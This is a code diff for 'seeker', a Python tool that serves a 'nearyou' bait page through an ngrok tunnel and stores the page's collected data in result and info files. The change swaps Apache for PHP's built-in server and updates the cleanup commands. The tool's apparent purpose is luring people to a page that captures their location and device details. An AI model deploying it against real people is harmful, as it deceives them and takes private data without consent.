@@ -14,20 +14,13 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
-result = '/var/www/html/nearyou/php/result.txt'
-info = '/var/www/html/nearyou/php/info.txt'
+swd = os.getcwd()
+os.chdir(swd)
+result = '{}/template/nearyou/php/result.txt'.format(swd)
+info = '{}/template/nearyou/php/info.txt'.format(swd)
 api = 'http://localhost:4040/api/tunnels'
-tmp = '/var/www/html/nearyou'
 site = 'nearyou'
-ver = '1.0.7'
-swd = ''
-
-try:
-	swd = os.readlink('/usr/local/bin/seeker')
-	swd = swd.replace('seeker.py', '')
-	os.chdir(swd)
-except OSError:
-	pass
+ver = '1.0.8'
 
 try:
 	raw_input          # Python 2
@@ -79,16 +72,9 @@ def version():
 
 def ngrok():
 	global api, site, swd
-	print ('\n' + G + '[!]' + C + ' Loading Template...' + W)
-	if swd == '':
-		print ('\n' + R + '[-]' + C + ' Symlink Broken or Missing...Skipping...')
-	else:
-		os.system('rm -rf {}'.format(tmp))
-		os.system('cp -r {}/template/nearyou /var/www/html'.format(swd))
-		os.chmod(info, 0o777)
-		os.chmod(result, 0o777)
-	print ('\n' + G + '[!]' + C + ' Starting Apache Server...' + W)
-	subp.Popen(['service', 'apache2', 'start'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
+	print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
+	with open ('php.log', 'w') as phplog:
+		subp.Popen(['php', '-S', 'localhost:80', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
 	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
 	subp.Popen(['./Ngrok/ngrok', 'http', '80'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
 	time.sleep(2)
@@ -210,7 +196,7 @@ def repeat():
 def quit():
 	global result
 	with open (result, 'w+'): pass
-	subp.call(['service', 'apache2', 'stop'])
+	os.system('pkill php')
 	os.system('pkill ngrok')
 	exit()
 
